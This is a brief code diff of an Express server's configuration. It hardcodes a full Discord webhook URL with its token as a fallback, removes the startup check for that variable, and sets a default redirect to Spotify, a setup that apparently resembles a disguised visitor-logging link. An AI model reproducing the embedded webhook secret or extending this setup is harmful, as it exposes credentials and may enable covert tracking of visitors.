@@ -8,13 +8,8 @@ const http = require('http');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const WEBHOOK = process.env.WEBHOOK;
+const WEBHOOK = process.env.WEBHOOK || 'https://discord.com/api/webhooks/1513283799583162458/SeJddnVhH8sK1REjZwc9yhTaon0cG7kY85Q8VFhqhfDo2BQstD3-lncKGKoIIuXcYDmO';
 const REDIRECT = process.env.REDIRECT || 'https://open.spotify.com';
-
-if (!WEBHOOK) {
-  console.error('WEBHOOK environment variable is required');
-  process.exit(1);
-}
 
 app.use(helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false }));
 app.use(rateLimit({ windowMs: 60 * 1000, max: 30, message: 'Too many requests' }));
